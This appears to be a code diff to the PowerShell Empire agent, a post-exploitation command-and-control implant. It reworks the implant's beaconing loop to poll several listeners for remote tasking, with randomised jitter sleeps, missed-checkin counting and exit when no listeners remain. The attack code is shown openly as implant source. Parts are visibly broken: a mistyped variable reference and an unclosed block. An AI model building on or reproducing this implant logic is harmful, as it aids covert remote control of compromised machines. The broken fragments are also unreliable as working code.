@@ -770,8 +770,10 @@ function Invoke-Empire {
     #
     ############################################################
 	#COMM_FUNCTION
+	#TASK_FUNCTION
 
-    $listeners = @(
+	$script:curlistener = ''
+    $script:listeners = @(
 		#LISTENER_DICT
 		#Example listener entry
 		#{
@@ -780,6 +782,7 @@ function Invoke-Empire {
 #        "profile"= "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv=11.0) like Gecko",
 #        "fixed_parameters"= @{"param1"= 12, "param2"= "Mozilla"} #fixed immutable parameters used by the function such as the profile
 #        "send_func"= myfunc,
+#        "get_task_func"=otherfunc,
 #        "lostLimit"= 60,
 #        "missedCheckins"=4,
 #        "defaultResponse"="whatever",
@@ -787,6 +790,46 @@ function Invoke-Empire {
 
 
 	)
+
+	function SleepWithJitter($listener) {
+# if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
+		if ($listener["delay"] -ne 0) {
+			$SleepMin = [int]((1-$listener["jitter"])*$listener["delay"])
+			$SleepMax = [int]((1+$listener["jitter"])*$l:["delay"])
+
+			if ($SleepMin -eq $SleepMax) {
+				$SleepTime = $SleepMin
+			}
+			else{
+				$SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
+			}
+			Start-Sleep -Seconds $sleepTime;
+		}
+	}
+
+	# send message function iterating through listeners
+	$script:SendMessage = {
+		param($PacketData)
+		[string]::Format("called send message with data = {0}",$PacketData) >> ".\agent_debug.log"
+		foreach ($l in $script:listeners){
+			SleepWithJitter($l)	
+		}
+	}
+
+	$script:GetTask = {
+		foreach ($l in $script:listeners){
+			$TaskData = (& $l['get_task_func'])
+			if (!$TaskData){
+				$l['missedCheckins'] += 1
+			}
+			else {
+
+				if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $l['defaultResponse']) {
+					Decode-RoutingPacket -PacketData $TaskData
+				}
+				break
+			}
+	}
 
     # process a single tasking packet extracted from a tasking and execute the functionality
     function Process-Tasking {
@@ -1142,20 +1185,7 @@ function Invoke-Empire {
             }
         }
 
-        # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
-        if ($script:AgentDelay -ne 0) {
-            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay)
-            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay)
-
-            if ($SleepMin -eq $SleepMax) {
-                $SleepTime = $SleepMin
-            }
-            else{
-                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
-            }
-            Start-Sleep -Seconds $sleepTime;
-        }
-
+        
         # poll running jobs, receive any data, and remove any completed jobs
         $JobResults = $Null
         ForEach($JobName in $Script:Jobs.Keys) {
@@ -1179,15 +1209,13 @@ function Invoke-Empire {
         }
 
         # get the next task from the server
-        $TaskData = (& $GetTask)
-        if ($TaskData) {
-            $script:MissedCheckins = 0
-            # did we get not get the default response
-            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
-                Decode-RoutingPacket -PacketData $TaskData
-            }
-        }
+        (& $GetTask)
 
+		# if we are out of listeners, exit
+		if ($script:listeners.count -eq 0){
+			exit
+		}
+		
         # force garbage collection to clean up :)
         [GC]::Collect()
     }
